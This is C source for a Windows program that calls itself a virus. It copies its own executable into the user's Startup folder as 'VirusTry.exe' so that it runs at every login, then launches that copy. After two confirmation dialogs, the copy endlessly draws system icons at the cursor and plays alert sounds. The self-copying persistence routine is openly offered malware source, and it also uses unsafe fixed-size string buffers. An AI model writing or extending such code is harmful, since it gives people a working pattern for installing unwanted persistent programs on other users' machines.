#if defined(UNICODE) && !defined(_UNICODE)
    #define _UNICODE
#elif defined(_UNICODE) && !defined(UNICODE)
    #define UNICODE
#endif

#include <pthread.h>
#include <tchar.h>
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#pragma comment(lib, "winmm.lib")

HINSTANCE g_hThisInstance;

// Stores the current location of the running app
char g_szAppPath[100];

// Stores the startup path of windows
char g_szStartupPath[100];

char* DUMMY_SYS_FILES_PATH = "C:\\Windows System Files";

void Init();
BOOL CopySelf();
BOOL IsInStartupPath();

void StartVirus();
void ExecuteFromStartup();

int WINAPI WinMain (HINSTANCE hThisInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR lpszArgument,
                     int nCmdShow)
{
    Init();

    if (IsInStartupPath()) {
        StartVirus();
    } else {
        CopySelf();
        ExecuteFromStartup();
    }
}

void showicons()
{
    HWND hwnd = GetDesktopWindow();
    HDC hdc = GetWindowDC(hwnd);
    POINT point;
    LPCSTR icon;
    LPCSTR sound;
    while (1)
    {
        GetCursorPos(&point);
        switch (rand() % 5)
        {
        case 0:
            icon = IDI_WARNING;
            sound = "SystemExclamation";
            break;
        case 1:
            icon = IDI_ERROR;
            sound = "SystemAsterisk";
            break;
        case 2:
            icon = IDI_QUESTION;
            sound = "SystemQuestion";
            break;
        case 3:
            icon = IDI_SHIELD;
            sound = "SystemHand";
            break;
        case 4:
            icon = IDI_WINLOGO;
            sound = "SystemStart";
            break;
        }
        PlaySoundA(sound, NULL, SND_SYNC);
        DrawIcon(hdc, point.x, point.y, LoadIcon(NULL, icon));
        Sleep(1000);
    }
}

void StartVirus()
{
    if (MessageBoxA(NULL, "Hi! \nThis is a SoftWare Execute. ", "Startup", MB_OKCANCEL) == IDCANCEL) {
        return;
    }
    if (MessageBoxA(NULL, "We are now prepare to show you some icons on your desktop. \nAre you okay? ", "Get Ready", MB_OKCANCEL) == IDCANCEL) {
        return;
    }
    showicons();
}

void ExecuteFromStartup()
{
    char szStartup[100];
    strcpy(szStartup, g_szStartupPath);
    strcat(szStartup, "\\VirusTry.exe");

    ShellExecute(NULL, "open", szStartup, NULL, NULL, SW_SHOW);
}

BOOL IsInStartupPath()
{
    char szStartup[100];
    strcpy(szStartup, g_szStartupPath);
    strcat(szStartup, "\\VirusTry.exe");

    if (strcmp(szStartup, g_szAppPath) == 0) {
        return TRUE;
    }

    return FALSE;
}

BOOL CopySelf()
{
    char szDest[100];
    strcpy(szDest, (const char*)g_szStartupPath);
    strcat(szDest, "\\VirusTry.exe");

    if (CopyFile(g_szAppPath, szDest, FALSE))
    {
        return TRUE;
    }
    return FALSE;
}

void Init()
{
    GetModuleFileName(g_hThisInstance, g_szAppPath, 100);
    SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, NULL, g_szStartupPath);
}

